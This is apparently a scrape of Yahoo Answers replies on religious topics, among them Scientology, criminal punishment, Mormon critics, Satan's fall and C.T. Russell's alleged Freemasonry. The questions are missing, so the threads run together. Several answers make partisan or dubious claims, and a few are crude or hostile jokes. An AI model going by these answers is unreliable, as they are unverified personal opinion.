But this belief is not very relevant to Scientology beliefs and practices. It is just incidental data that Scientologists regard as mildly interesting.    Scientology is information about life that enables a person to improve their own situation. It helps you make the changes that you want to make in your life.  It doesn't matter if your concern is improving your  relationship with your family, a desire to succeed in business or a quest clarify your life purpose.  Scientology assists with all those.    A basic Scientology principle is that greater awareness offers the only road to a better life.  To handle cars, jobs or relationships better, you have to know more about how they work.    It is clear to most that your relationship with your girlfriend or how well you do at work has very little to do with aliens.  This doesn't seem to be understood by critics.  But it is understood by Scientologists.|`|5yWkjp9baa	No, it's not the Christians that are making this stuff up.

(Maybe it makes them feel better about themselves)  Ridicule and invalidation are the same thing really.    Heres a factual description for you (From a Scientologist):    Scientology is a new religion. It is an applied religious philosophy. By applied is meant that it is for use in life and  living. You actually use it in your day to day life to change and improve existing conditions. It is a practical religion.  All religions if you study them have a basic philosophy, but they also have certain dogma, rituals and observances and a certain faith or belief is required. There is nothing wrong with this , but Scientology is not that kind of religion. It acknowledges the principle of God or the Supreme Being but does not try to define or describe this principle,  leaving it up to the individual.  It is also not a messianic religion. This means there is no worship of prophets or messiahs or gods. It is not belief or faith based. In Scientology a truth is true for you according to your own observation and experience .  The dictionary definition that applies:    Religion: The spiritual or emotional attitude of one who recognises the existence of superhuman power or powers.    The most basic principle of Scientology is that YOU are your own immortal soul, that this is not a thing you have but what YOU actually are.  Scientology believes or considers that Man is basically good. This is different from many religions that promote that he his natively evil or bad unless made good.    The whole purpose of Scientology knowledge application and procedure is to increase an individuals understanding and awareness of himself as a spiritual being and to rehabilitate his native abilities and potential.  When you do this there sphere and zones of his positive influence increases and moves outward into his life , his family and friends, his groups and Mankind of which he is part .    How this result is achieved is the technology of Scientology, which was developed by L Ron Hubbard from discoveries he made after  extensive research into the field of the mind and the human spirit.  Some of this knowledge was already existing in the sacred lore of ancient texts like the Veda or Vedic Hymns going back 10,000 years. New and additional discoveries were  made about the nature of the human spirit and fully recorded and codified .  Scientologys closest spiritual ties with any other religion are with Orthodox (Hinayana ) Buddhism with which it shares an historical lineage. But even here the relationship is based mainly on friendship and the recognition of the being as a spirit rather than any organizational ties.    L.Ron Hubbard published 18 basic books from 1950 to 1955 to fully communicate the basic principles of Scientology, the path of his research and the technology that  he developed from this.   He completed all his research before his death in 1986 and left all his materials and copyrights to the Church of Scientologys Religious Technology Centre along with most of his personal estate when he died.    The Church of Scientology is currently established iand operating internationally in over 160 countries world wide. However it is still a new religion, less than 55 years old.  The true story of Scientology as a religion goes like this:  1. A philosopher developes a philosophy about life and death.  2. People find it interesting.  3. People find it works.  4. People pass it along to others.  5. It grows.    This is just an overview.  L.Ron Hubbard explained fully the theology and technologies of Scientology in more than 500,000 pages of writings, including dozens of books and over 3,000 tape recorded public lectures.    I hope  this helps.|`|604x6fDLaa	Scientology is about the "Church" of Scientology making money. It was founded because L Ron wasn't making enough money as a science fiction writer.

The CHURCH of Scientology is not pure anymore - I equate it to the Catholic Church saying buying indulgences can forgive sins, but that's another matter.    As to aliens, I haven't progressed very far in my practice yet, and I've been told there are truths I'm not ready to hear yet - something I can understand since I've already seen, heard, and DONE so much that's incredible already.    (And L. Ron Hubbard did NOT say he'd like to start a religion.  Someone overheard him quoting a work of fiction, I forget what, in which the line was: A million men, a million religions, a million dollars - or something to that effect).

2LsR22g9aa	Well seeing as how Christians are not supposed to judge I have a feeling theres going to be alot they have to answer for.    I have a feeling Gods going to be most angry about the persicution of minor drug offenders. Locking someone up for having drugs is compleatly ridiculous.|`|K24JFTOcaa	so, you want to free all the criminals      they still have a chance to turn to God|`|uhHbcIopaa	Because if there was no punishment everybody would break the law. The State has to make sure everybody is safe.|`|Ob0GqDc1aa	Nice pussy. LOL|`|7kJFmyxdaa	We have to go by the laws of this land. When someone commits a crime they should be punished for what they do. Ultimately God is the final judge when we die. But while we are on this earth we must obey the laws of this land.    Romans 13:1-7  13 Everyone must submit himself to the governing authorities, for there is no authority except that which God has established. The authorities that exist have been established by God. 2 Consequently, he who rebels against the authority is rebelling against what God has instituted, and those who do so will bring judgment on themselves. 3For rulers hold no terror for those who do right, but for those who do wrong. Do you want to be free from fear of the one in authority? Then do what is right and he will commend you. 4For he is God's servant to do you good. But if you do wrong, be afraid, for he does not bear the sword for nothing. He is God's servant, an agent of wrath to bring punishment on the wrongdoer. 5Therefore, it is necessary to submit to the authorities, not only because of possible punishment but also because of conscience. 6This is also why you pay taxes, for the authorities are God's servants, who give their full time to governing. 7Give everyone what you owe him: If you owe taxes, pay taxes; if revenue, then revenue; if respect, then respect; if honor, then honor.|`|18f23c8e100103ef2ddb3c61fe1e09e3aa	Point 1:    There are man's laws and God's laws.

That's why I do what I do.|`|5Smw52iTaa	Burning them in order to send them to "god" faster is kind of outfashioned...|`|ysK1UUVHaa	There's a difference between punishment and discipline. On earth, criminals are disciplined to try and make them change (by man and also God)  If all else fails, God shows them real discipline.  Eternal Discipline|`|a3j82sBpaa	Because nobody is sure that there is a hell. Besides, if there is, we might not meet there. Punishment is also a warning to the others.|`|XDRRg5o4aa	As a social worker my mom is against prisons. According to the research prisons have failed to do what they were made for except punishment. They do not rehabilitate nor do they prevent prisoners from being in contact with the outside world. In reality, prisons have failed. We as a society must find other alternatives to prisons.|`|fe17567cd409e9ef948b874d8091f511aa	Because they'd just commit more crimes. Would you want someone to break in your house? Didn't think so.|`|16916096b289948e0c50f1b326de159aaa	Because if we let them run amok they would keep killing and stealing. And it would probably be all fun and games until it affected you.|`|2Hot9EJiaa	Ok, I will humor your for just a moment-  you are saying that we should not put criminals in jail, or bring any one before a judge on earth?  So you want murderers and rapists loose in this world?  I hope not.  There has to be laws while on the earth as well.  Granted God will have the ultimate and final judgment.  But I also know that many of the criminals have come to know Christ.    God never said that we were not to bring humans to trial and conviction when needed.

aac509d23ce8da767d68e4f377f3f4c7aa	There is corruption in all religions (as there is in all politics) and the disorganized ones are likely to be even more corrupt because they are not so public. All power corrupts, it has been observed. All people are sinful, it is undeniable. The Bible says "Everyone who sins breaks the law; in fact, sin is lawlessness." (1 John 3:4)    However, Christians also know that the worship God accepts is to help the poor, orphans and widows etc - help given because of God's great love for us, and given in Jesus' name. There is no corruption in such service! And it takes a lot of organisation to render that help in global crisis situations. Some individuals may creep in to profit, but you'll hardly find any such hypocrites because the work is not glamourous, prestigious or financially rewarding. Nor does the world care to acknowledge it. If you want to see organised religion that is not corrupt, go join the religious charity groups getting their hands dirty in the world's hell-holes.|`|mlmSRkhGaa	No more corrupt than every government there is|`|ZNo1Ah5taa	because when you get a small group of people (usually men) in controle of a large group of people the ideals that brought them together in the first place tend to get distorted, forgotten and twisted to mean new things to justify the actions of the small elite.|`|b8e3dd68b7fdbbbac6132e0c73015651aa	the more power, the more corruption.|`|rFFYCmOGaa	Most of them are not, financially and legally speaking. That fact still does not excuse the other bad stuff they do like spreading superstition, creating false fears so that they can exploit the weak...... come to think of it.... that in itself is probably the worst form of corruption.|`|LuN1unJ3aa	Some religious groups definitely face challenges with corrupt leaders, but in other instances, the leaders are not corrupt. The case is worse for politicians, but even then, you'll find some politicians who are not corrupt.|`|7422ddf097669bd7b6e3d48e56258b87aa	Of course it is. So what?    http://douglawrence.wordpress.com/who-to...|`|AA11709855	*Religion     Very corrupted, it needs attention as psychosis.|`|ReXZCVg9aa	1) Gay Suicide  2) The ban on stem cell research kills more people every year then terroism  3) Lowest Education rates found in the US|`|2d3c0dd80f2737f4fd6ec8f62b612c70aa	Most, yes because being a Christian embraces more than reading the Bible, praying, and singing hymns on Sundays. It involves doing things both for God and for people. The Bible says: Let us love, neither in word nor with the tongue, but in deed and truth. (1?John 3:18)   www.watchtower.org
aBHY2iXraa	The hierarchy are certainly prepared to believe (and propogate) a lie in order to make money. That's close to corruption.
GL87Xgdhaa	well, we cannot say all gangs hate on a group of people.

I happen to be proud of being black with no problem of any other race and don't want my race to  END because of a few racist ignoramuses with a lack of life experience in socialising. I would prefer to continue my efforts in keeping my race alive, thanks.    Edit: Also your theory would take possibly hundreds of years to work because younger people are having children more commonly these days (with their own race) and the cycle will reset right to the beginning again.|`|tlUihEOvaa	I'm Asian and I would marry someone out of my race for sure but I haven't found someone yet.     I mostly like Hispanic girls but they would never look at me or at least that's what I think.|`|GPznIhzMaa	Racism still wouldn't end because people will continue to come up with ways to hate on each other. They'll probably fight over stuff like who has more white vs. black vs. Asian blood or straight vs. curly hair.    I'm Chinese and my boyfriend's Hispanic.|`|UhtSE2B6aa	Nope. There would still be racism against people that weren't mixed with the same races as another person.      And about me "doing my part", I only date Black women because I can relate to them culturally. I don't feel like I should go out and get with a woman of another race to prove that I'm not shallow or racist. Moreover, I have no problem with people dating interracially.|`|djLDZXoZaa	well, im biracial and i hate everyone.  although, since i hate without regard to race, i suppose you are right.  also, i am doing my part by dating a mexican (im not hispanic!).  i suppose if we have children together i will teach them to hate everyone (except me, and maybe my dude) indiscriminately.  then i will train them to be my unholy army of the night.  bwuahahahaha!
7d16b3b33c15681f9d53425cac12ac67aa	It is at times slightly annoying. Right now I have way too much free time on my hands. Shame, shame. They do say idle hands are the devil's workshop. But I made a promise to God that if I could not find a job I'd spend time helping Him and His work. I guess this is part of it.     For some questions you just ignore the bashers. Some come off directly criticizeing the church. Espically the one that go, is it true.... yadada yada yadada?     You know it's a set up right at the beginning. The thing is what if someone is seeking the truth, if they are truely seeking and they see that then it may discourage them from finding the gospel. So I think the best thing is to answer the question to the best of our ability to let a possible investigator know the truth and then move on. That's about the only thing I know.     Other questions out there make me laugh. I am sorry, the level of education or knowledge is just so unbelievable. I end up laughing at the keyboard.     Oh and then there are the misconstrewers and misconceptioners who manage to twist our doctrines and make them sound so bizarre. When you catch them and tell them it's a a misconception or a twisting of things.... *sighs* Like I said, the only thing to do is set the record straight and then move on.     I am also beginning to feel sorry for some of the posters on here. They come off as very angry and ranting. I just feel sorry for them I really can't help it.     I agree  it's hard to take a lot of it seriously but I guess the best thing is like I said, answer for the sake of an investigator who maybe seeking and then move on.    Edit: It is possible to provide ammunition... shoot everything we say can be taken out of context. But that's the anti and Ex Mormons job, to take things out of context, to twist and find things to make our faith look a ridiculous mockery. We only have a few options, to clear the record, or ignore it.  At this point it really is up to you.|`|Tcu0NWkUaa	I, like Dr. M, have quit responding to many of the posts that are directed to "LDS/Mormon . . . " as they have proven to be mostly antipathetical in nature.  I'm tired of the bigoted rhetoric and find no sense in sharing pearls that will just be trodden under foot or discarded as worthless.

I guess the key is to humbly bear witness to the truth and let those who simply have an axe to grind - let them grind it - there is nothing we can do to change that person's wrongful opinion.  We can bear witness to the truth with humility.    Thanks for asking this - I have wondered from time to time as well.|`|AA11297267	Let's face it -- you've got a hard row to hoe there.  Much of mormonism is flat-out bizarre.  I know mormons sometimes like to wear that as a badge of honor, that you're special *because* you're so different...  But that's not always the case.    There are some serious problems with mormon theology, with the behavior of high-ranking church officials (have a look sometime at Spencer Kimball's statments during the Hoffman affair), changing doctrine that was "revealed" as perfect and unchangeable, attempts by high-ranking church officials to cover up things that aren't favorable to the church, the problems with the origins of your religion...    The way I see it, you have two choices.  You can ignore it all, and just go on with your mormon life, or you can confront it head-on.  Sometimes you'll come up against patently false accusations against mormonism or mormons that you will be able to legitimately set straight.  But fair warning:  you will also come up against those that are valid criticisms, and these may cause you -- if you search for truth -- to confront some real problems with your theology.  Are you brave enough to be honest about those things, or will you ignore facts and just stick your head in the sand?  It's up to you.    Peace.|`|A9vvZ6eUaa	How about your intercept their wagon train and slaughter them since they are invading your turf.|`|TzY9vkinaa	I have a few people that i've stopped responding too and try to focus on the more sincere questions.|`|LcYeN6m5aa	I've quit answering many of the LDS "questions" on here because they are simply disrespectful to my faith.  I won't cast my pearls before swine or surround myself with their filthy lies and bigotry or let it in my house anymore.  My time is worth more than that, my faith is more valuable than that.     In fact I get tired of seeing some things starred as "interesting" when it's just disgusting questions asked by malicious people.   I wish there were a way to star things "un-interesting" although I've not had the time to clear out my account of people who star things that are disrespectful to my religion....but then my opinion and others' opinions on what is disrespectful are different as well.   Some of these questioners need to learn to use the "search" feature on Y!A and quit asking the same question.   I think a lot of them (questioners) think they are smart and need to get a life and quit wasting it on Y!A before they only have a life of antagonism towards another faith to review as their life's accomplishments....I mean seriously - if you oppose it that seriously - you only waste your time on Y!A?   Go publish a book and see if you can get the Tanners to sponsor it and get the "Christian Bookstores" to sell it and at least make some money off it.....seriously....how committed are they?  I think if they were REALLY dedicated they'd go knock on doors and would try to save me for REAL instead of asking jeuvenile questions on Y!A.

As a general rule, the more you want put into a Bible the more it costs. A basic, no frills, no pictures, no maps, no concordance, no verse cross referencing, no "super thin" pages, hard cover, ordinary size font, "just the contents in the front" type Bible is very cheap.   Conversely, a Bible with cross references, superthin pages, maps, a concordance, exotic fonts, and bound in leather is "more expensive".   If your local retailer doesn't have at least one cheapish version then you need to find another source because there are Bibles around at very low prices.

For example, if she enjoyed skiing you might consider that. Or study up on the type of music or recording artists that she likes.    If you don't know, then ask her.

7kJFmyxdaa	Turning the other cheek means when someone hurts you you should just walk away and let God handle it. But our human tendency is to strike back at that other person. God does not want this to happen. His word says that vengeance belongs to Him and Him alone. It is hard for us to just walk away from someone who has hurt us. It was hard for me but the more I grew in my faith in God and His word the more I learned to walk away from those who hurt me. It took a long time for me to do, but I have learned to do it.|`|Run7dyraaa	When someone hurts you,or does something bad to you, you turn and walk away. You don't confront them.

On the surface, it's pretty simple advice: don't hold grudges against people, don't think about revenge or be wrathful, because those who wrong you will get their comeuppance in the end.    However, there is also an interesting cultural aspect to it:    If a Roman citizen wanted to really strike or insult someone who was of a lower class than him (a slave, a Jew, an early Christian, a Samaritan, a prostitute, etc), the proper thing to do would be to strike you across the right cheek with the back of his right hand.  By turning the left cheek towards the attacker, you put him on the spot: he can't strike you with the back of his left hand, because the left hand is considered unclean, and using it to touch another person would reflect very poorly on the attacker.  However, if he slaps you with the palm of his right hand, or punches you, he's treating you as an equal.    Thus, "turn the other cheek" can be seen as the first call for equal rights and treatment by an oppressed social class.|`|7ee11f32ce402e558134b3f3e6323823aa	for me it's about practicing compassion..say when somebody cuts you off in traffic, is rude in  a store, or snaps at work...it's about taking a step back and remembering when you yourself were stressed due to money,family,etc problems..and what it is like to be stretched..and then showing a little kindness/compassion back, like letting them go first in line, or butt in  in traffic,etc...|`|CnqGu1Taaa	start turning the other cheek and find out!|`|03c287c9e9e2feef723946b70ad122f4aa	Refers ONLY when teaching the word of God.

EBGdlo35aa	He is first mentioned *specifically* here  http://www.studybibleforum.com/htm_php.p...    Jesus said, "I was watching Satan fall from heaven like lightning"    Some say this is a prophetic vision, and that Satan had not fallen yet when Jesus spoke this.  Others say that Jesus was speaking of a past event.  Revelation recounts a fall of Satan in Jesus' future - so, either Satan fell once before and (did or will) fall once after Jesus, or his single fall (will or did) occur after Jesus.    Some claim that in Job, Satan is still a faithful servant of God.  Others claim that Satan's fall occurred even before Adam and Eve were created.  The bible does *not* tell us if either of these are true - they are just traditions not a part of the bible.    Jim, http://www.bible-reviews. com    P,S, - references to Isaiah 14 are clearly erroneous.  Read the entire chapter and you will see clearly that Satan is neither mentioned nor referenced.  The passage is very clearly described as a derogatory description of the king of Babylon.    P.P.S. - forgot about Ezekiel.  Another clear reference to someone OTHER than Satan.  Don't take my word for it - read the chapter referenced.  I'm simply amazed by people who use a passage out of context to support a doctrine when the immediate context *clearly* indicates that the passage is unrelated to that doctrine.|`|e5d10eae9a48e059f9317d719d5b716caa	I guess they had other things to talk about.|`|ysK1UUVHaa	Good point, ill look into that|`|NjPjpewlaa	When God created all the angels...

He deceived Eve. He has always been from the beginning.|`|246ef99fe9f19ae4da709934694ddcd8aa	The story of the Angel's rebellion and when they fell is from the Book of Enoch which was written much later than Genesis. The story of their Fall supposedly takes place before the Garden of Eden. If you actually read Genesis, it says that Eve was tempted by a SNAKE. The interpretation of the snake being Satan came much later.  http://en.wikipedia.org/wiki/Book_of_eno...    ADD: Unlike most Christians, most Jews believe that Lucifer, also known as "The Adversary," was doing god's work by trying humans to make them stronger. Read the Book of Job to see God working with Satan.    The Book of Enoch is not part of the OT; Jews do not follow it though some consider it apocryphal (worthy of reading but not canon).  It was, however, especially popular with the followers of Jesus and the early Christians which is funny because it is NOT currently canon in most Bibles. The Ethiopian Church is the only one that actively teaches it.  Much of the NT is heavily influence by it though.    ADD ADD: Also, there is a serious inconsistancy about the Fall of the Angels. If the fall happened before the Garden of Eden then that means there were TWO falls (also, described in the book of Enoch). The OT very clearly says that shortly before the Flood the Watchers who were the sons of Gods (unually interpreted as angels) lusted after the daughters of Adam; they had babies with them that were giants (often refered to as the Nephilim).  http://en.wikipedia.org/wiki/Nephilim  This means that OTHER angels fell at a different time.|`|ZOifSvNhaa	*** Awake 2/07 pp. 12-13 Who Is Satan? Is He Real? ***    What the Bible Says    The Bible describes Satan as a real person who exists in the invisible spirit realm. (Job 1:6) It tells us about his vicious and ruthless qualities as well as his evil actions. (Job 1:13-19; 2:7,?8; 2?Timothy 2:26) It even records conversations that Satan had with God and with Jesus.Job 1:7-12; Matthew 4:1-11.    Where did such an evil being come from? Long before man existed, God created his firstborn Son, who eventually came to be known as Jesus. (Colossians 1:15) In time, other sons of God, called angels, were created. (Job 38:4-7) All were perfect and righteous. However, one of those angels would become Satan.    Satan was not his given name at the time of his creation. It is a descriptive name, which means Adversary; Enemy; Accuser. He came to be called Satan because he chose a life course in opposition to God.    Feelings of pride and rivalry toward God grew within this spirit creature. He wanted others to worship him. When Gods firstborn Son, Jesus, was on the earth, Satan even attempted to get Jesus to do an act of worship to him.Matthew 4:9.    Satan did not stand fast in the truth. (John 8:44) He implied that God was a liar, when, in fact, he was the liar. He told Eve that she could be like God, whereas he wanted to be like God. And through his deceitful ways, he achieved his selfish desire. To Eve, he made himself higher than God. By obeying Satan, Eve accepted Satan as her god.Genesis 3:1-7.    By fomenting rebellion, this once trusted angel made himself Satanan adversary and enemy of God and man. The designation Devil, which means Slanderer, was also added to this wicked ones description. This leader of sin eventually influenced other angels to disobey God and join his rebellion. (Genesis 6:1,?2; 1?Peter 3:19,?20) These angels did not make mankinds situation better. Because of their imitating Satans selfish ways, the earth became filled with violence.Genesis 6:11; Matthew 12:24.      ---- Satan used the serpent to decive eve sort of like a puppeteer. As you read above you can see that satan was origionally one of gods sons who decided he wanted to do what he wanted and rebelled with Adam and Eve.     The fight described at Revelation chapter 12 when satan gets thrown out of heaven is part of the first prophecy in the bible being fulfilled and coming to a conclusion. The bible has a theme throughout. That theme is The sanctification of gods name. How Jesus prayed  the lords prayer @ Matt 6:9-12 highlights this theme.     read more here!  http://watchtower.org/e/rq/article_05.ht...|`|03c287c9e9e2feef723946b70ad122f4aa	You got it backwards.|`|247e16fe699fb80e444deaffc4762c81aa	he was referred to as 'the serpent'|`|bfuYiSxfaa	he came all over it, not into it!

Remember Prometheus brought Fire to Humans and fire gives light.|`|iaPtohhhaa	Rebellion in heaven occurred before the Garden of Eden (Is 14:12-, Ez. 28:13).|`|VRl1jENHaa	Satan was definately in the Garden of Eden, as described by the prophet Ezekiel:    Ezekiel 28:12b:   You were the seal of perfection,         Full of wisdom and perfect in beauty.          13 You were in Eden, the garden of God;         Every precious stone was your covering:         The sardius, topaz, and diamond,         Beryl, onyx, and jasper,         Sapphire, turquoise, and emerald with gold.         The workmanship of your timbrels and pipes         Was prepared for you on the day you were created.          14  You were the anointed cherub who covers;         I established you;         You were on the holy mountain of God;         You walked back and forth in the midst of fiery stones.          15 You were perfect in your ways from the day you were created,         Till iniquity was found in you.          16  By the abundance of your trading         You became filled with violence within,         And you sinned;         Therefore I cast you as a profane thing         Out of the mountain of God;         And I destroyed you, O covering cherub,         From the midst of the fiery stones.          17  Your heart was lifted up because of your beauty;         You corrupted your wisdom for the sake of your splendor;         I cast you to the ground,         I laid you before kings,         That they might gaze at you.          18  You defiled your sanctuaries         By the multitude of your iniquities,         By the iniquity of your trading;         Therefore I brought fire from your midst;         It devoured you,         And I turned you to ashes upon the earth         In the sight of all who saw you.

All I can say is that it is not Almighty God.|`|MVT34FZsaa	They say anything what the Watchtower Society's leaders asks the to say. Very proudly they defend the organization and even lie.|`|UQTAN7cgaa	If you read the text you'll note he's claiming he's a mason figuratively, not literally.    Russell was not a freemason, he was never Initiated, Passed or Raised in any regular masonic lodge.    http://www.masonicinfo.com/famousnon.htm    and from the wiki article:  http://en.wikipedia.org/wiki/Taze Allege...    After his death, Russell was accused of having close ties with Freemasonry,[51] with claims that he employed various Masonic symbols in his publications, and further suggestions that such associations are connected with occult practices. For example, in later editions of the Studies in the Scriptures series, a winged solar disk appeared on the front cover, which critics claim is an exclusively Masonic symbol. However, Russell's use of the winged solar-disk originated from his understanding of Malachi 4:2, which denotes a sun with wings, as a symbol that Christ's millennial Kingdom had begun.[52] The Encyclopedia of Occultism and Parapsychology says: "The Witnesses have, like many Christian churches, shown a marked aversion to Spiritualism and other occult phenomena. Very early in the groups history Russell attacked Spiritualism (which he called Spiritism)"[53]. In his writings, Russell stated that membership in Freemasonry, Knights of Pythias, Theosophy, and other similar groups was unscriptural. He denied having direct knowledge of Masonic practices, considering them to be "grievous evils",[54] and discouraged joining such organizations.[55] In 1913, Russell delivered a Biblical speech in the Masonic Lodge of San Fransico, where he openly says that he has "never been a Mason".[56] Freemasons have stated: Russell was not a Freemason. Neither the symbols found in the Watchtower nor the cross and crown symbol are exclusively Masonic. [57]    ++++++++++++    why is it that anti-masons, and anti-anything type folks like to take one passage out of context and try to prove a lie with it?????|`|fxHEZGcCaa	Greetings,    The fact that this accusation continues to be used even though it has been clearly refuted for almost a hundred years, tells you how dishonest and deceptive some people are.      "The Temple of God" is a discourse by Pastor Russell. Russell's own comments on this very subject should settle the speculation once and for all. Was he a Mason?    It is evident he was familiar with the Masons. In the beginning of the discourse he points out how he is "more" than many of the groups, Masons included. These first set of quotes are all found on page 120.    "Do our Masonic friends understand something about the Temple, and being Knights Templars and so on? We know more".    He goes on to say that Masons and others have..."that little bit of truth".    Russell admits "...we remember we had very similar ideas, and not very long ago; but, without finding any fault with anybody, we are glad that we are coming to see a more reasonable and harmonious way...".    Russell points out where he agrees with the Masons. But if his words are taken out of context it would appear that Russell was saying he was a Mason. But, you will notice that he refers to Masons as "them" and "they", excluding himself and the brethren.    ...I have talked to them at times, and they have said, How do you know about all these things? We thought nobody knew anything about these things except those who had access to our very highest logic".    So, Russell did say "Now I am a free and accepted Mason" but, in context it is obvious he was not, because he included all his brethren in the faith as being "Masons" as well. He also said they were all Masons, but "not after the style of our Masonic brethren".    Russell went on to place himself above the Masons because he felt he had more "secrets" than they did, his coming from the Lord himself!    "I said that I had been in conference with the Great Master Workman, the Lord himself, and I have secret information through the Holy Spirit and guidance in respect to what the Bible says, and that contains all the truth, I believe on every subject. And so if we talk to our Masonic friends about the Temple and its meaning, ...our Masonic friends are astonished....We are going to discuss free and accepted Masonry--the Bible Masonry, my dear friends".    So, it is evident that while Russell tells all listeners that he and they are all "Masons", it is obvious that he has his own meaning for the term, which he calls "Bible Masonry". As we go on, it is evident he feels he has transcended masonry's secrets.    Later in his discourse, he further parts company with Masonic theology, which does not recognize Jesus Christ as their head. Russell says    "...for you know the Head of the Pyramid is a perfect pyramid itself, and all the stones under that simply come into line with the top stone; and that top stone is what the Bible declares Jesus is--the chief cornerstone".    Russell now goes on to compare the heavenly reign of himself and his followers, the "Royal Priesthood" (who he says will be divine) to the Knights Templar of the Masonic Lodge.    "...A thousand years during which these Knights Templar are to scatter blessings to all the families of the earth".    he just loved to use masonic terms and show how he and his followers were superior "Masons", superior "Knights Templar". He then offers full freedom of choice to his followers in these words,    "...If you feel that you want to become a member of the Free and Accepted Order of Masonry, and do not feel free and masonic enough as a follower of Christ, God bless you, use your own judgement; that is yours to decide not mine. But now I am talking about this great order of masonry of which Jesus is the Grand Master. This Order is to be entered in a peculiar way. There are certain conditions--the low gate, the narrow way, the difficult path".    Then he makes a direct statement on the subject of whether or not he was a Mason.    "Although I have never been a Mason, I have heard that in Masonry they have something which very closely illustrates all of this".    So, although Russell compared his "Royal Priesthood in Christ" to the Lodge, he felt himself above ordinary Masons, and in fact said plainly he never was one.    "Do you mean that the Lord's Church is a secret order? Yes, surely it is...Did the world know the great Mason when he was here? No. Did the world slay the great Master Mason? Yes".    So now we have Russell referring to our Savior, Jesus Christ as a "Master Mason".    In case we missed the point, Russell expands on it,    "So you and I as under-masons are waiting for the return of our Master Mason, who gave his life on this very account in connection with this secret of the construction of the Temple, the Church".    So, by Russell's own words, minus the parallels he draws all through this discourse, he plainly says he has never been a Mason.    Yours,    Ron Rhoades|`|c898150558ddb7ef0e50782e0a5d05b4aa	Those who are familiar with Russell's writings know he was not a member of the Freemason organization, and that was only interested in the comparison of masonry (building) with the building of the spiritual temple of God as spoken of in the Bible, and the fact that the building work of God's temple is not understood by the world.    Pastor Russell's Convention Discourses:    "So I am glad to address delegates especially here from the Bay cities, and also including some thirty-five states represented in the excursion party. I am very glad to have this particular opportunity of saying a word about some of the things in which we agree with our Masonic friends, because we are speaking in a building dedicated to Masonry, and we also are Masons. I am a Free Mason. I am a free and accepted Mason, if I may carry the matter to its full length, because that is what our Masonic brethren like to tell us, that they are free and accepted Masons. That is their style of putting it. Now I am a free and accepted Mason.     I trust we all are.     But not just after the style of our Masonic brethren. We have no quarrel with them. I am not going to say a word against Free Masons. In fact, some of my very dear friends are Masons, and I can appreciate that there are certain very precious truths that are held in part by our Masonic friends."    The context of the entire discourse (only a small part is displayed here) shows that he was referring to "Bible masonry", not the human organization that goes by the name of 'Free Masons". He was using Free Masonry terminology to illustrate the Biblical building being done by God through His church. -- See: Luke 6:47,48; Romans 14:19; 1 Corinthians 3:9,10,12; 14:12,26; 2 Corinthians 6:16; Ephesians 4:7-16; 1 Thessalonians 5:11; Revelation 3:12.    In that same sermon, Russell, in referring to the human organization, said, "I have never been a Mason."|`|Lt41tqwZaa	Well this is actually one of the few times Im going to agree with the JWs. Russell was very sympathetic to the Masons and was friends with some, and probably borrowed a lot of ideas from them, but I dont believe he was ever actually one. Just read the whole paragraph that you got that quote from:    So I am glad to address delegates especially here from the Bay cities, and also including some thirty-five states represented in the excursion party. I am very glad to have this particular opportunity of saying a word about some of the things in which we agree with our Masonic friends, because we are speaking in a building dedicated to Masonry, and we also are Masons.

He was just speaking metaphorically when he said he was a Free Mason.|`|wEujkbw2aa	I read that he was one.|`|jNi4usSKaa	I don't know that any ties to the freemasons can be validated, but it might be interesting to jw's to know that his graveyard headstone is a pyramid! Russell was quite obsessed with pyramids, even using measurements from the Great Pyramid as part of his eschatology.|`|1d172da8266bc8049a171e749d536d67aa	Speaking metaphorically? Nah.      If you look through Russell's writings, he's acknowledging their role in his background, while launching forth on his own brand of prophesy.      Was he technically a Mason in every sense of the word?      Does it matter when the Watchtower currently as well as for years has condemned Freemasonry.

And in that I rejoice. 9 Indeed I shall continue to rejoice,  19      10 for I know that this will result in deliverance for me 11 through your prayers and support from the Spirit of Jesus Christ.  20      My eager expectation and hope is that I shall not be put to shame in any way, but that with all boldness, now as always, Christ will be magnified in my body, whether by life or by death.  21      For to me life is Christ, and death is gain.  22      If I go on living in the flesh, that means fruitful labor for me. And I do not know which I shall choose.  23      I am caught between the two. I long to depart this life and be with Christ, (for) that is far better.  24      Yet that I remain (in) the flesh is more necessary for your benefit.  25      And this I know with confidence, that I shall remain and continue in the service of all of you for your progress and joy in the faith,  26      so that your boasting in Christ Jesus may abound on account of me when I come to you again.  27      12 Only, conduct yourselves in a way worthy of the gospel of Christ, so that, whether I come and see you or am absent, I may hear news of you, that you are standing firm in one spirit, with one mind struggling together for the faith of the gospel,  28      not intimidated in any way by your opponents. This is proof to them of destruction, but of your salvation. And this is God's doing.  29      For to you has been granted, for the sake of Christ, not only to believe in him but also to suffer for him.  30      Yours is the same struggle as you saw in me and now hear about me. 13     http://www.usccb.org/nab/bible/philippia...|`|b8e3dd68b7fdbbbac6132e0c73015651aa	you'd think if the smartest man in the universe were to write a book that is to serve as the guide for humanity, it would be a bit better and clearer than the bible.|`|1ffb5797d2e26ccb8eb17dd3db6e22c0aa	You are correct.. Therefore it is not illogical to therefore conclude that he didn't WANT to write a book. NOR did he intend a MERE book to become the SOUL source of teaching and knowledge.  He probably gave us OTHER tools, other then a book.     I hope you aren't making the mistake of assuming God wrote the bible?  He didn't.  He merely made sure the people who did,  didn't write into it any major errors.  That is why it is considered "fit for instruction" and "inspired"   He didn't ensure the writers wrote in the most obvious way..the most eloquent manner... NO,  just that he made sure what they did write wasn't full of doctrinal mistakes.    ALSO.. technically the "bible" didn't exist for nearly 400years, so really he didn't write the bible at all.. he inspired his apostles to write individually.     The Catholic CHURCH, later on,  studied the writings and convened councils to decide WHICH books to include.   Thus the Catholic church believes that AGAIN,  God helped the Catholic church choose the right books to include when creating a bible for other Christians to follow and learn from.     BUT.. in all this.. the work is done by humans.. they are the key to understanding it.  The Apostles understood what Christ taught them.  They passed that on, orally to others. Some of them wrote stuff down. So and on and so forth.  So the deposit of faith.. what we KNOW is not just in the bible..but ALSO in the oral teachings the HUMAN teachings.  The Catholic church keeps all these together and consistent.      So you are RIGHT.. God COULD have written a better bible..but he didn't want to.  He wanted us to ALSO rely on oral traditions and TEACHINGS of others.    JUST like Schools rely on TEACHERS to teach kids. They don't just give 'em a text book and say -- read it and teach yourself.|`|6aa3462db415d437fbd6038465117c79aa	It's strange how uneducated people claim to understand it better than the educated people.

